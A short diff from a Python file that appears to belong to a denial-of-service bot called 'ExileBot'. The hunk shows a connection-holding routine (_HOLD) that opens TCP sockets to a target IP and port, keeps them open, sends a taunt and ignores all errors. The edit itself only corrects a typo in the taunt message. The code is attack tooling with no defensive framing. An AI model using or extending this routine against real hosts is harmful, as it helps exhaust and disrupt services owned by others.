@@ -539,7 +539,7 @@ def _HOLD(_ip, _prt, _socks, _delay, _time):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             _sockets.append(s)
             s.connect((_ip, int(_prt)))
-            s.send('woe to the vanquied! #Rekt @ExileBot'.encode())
+            s.send('woe to the vanquished! #Rekt @ExileBot'.encode())
         except:
             pass
     
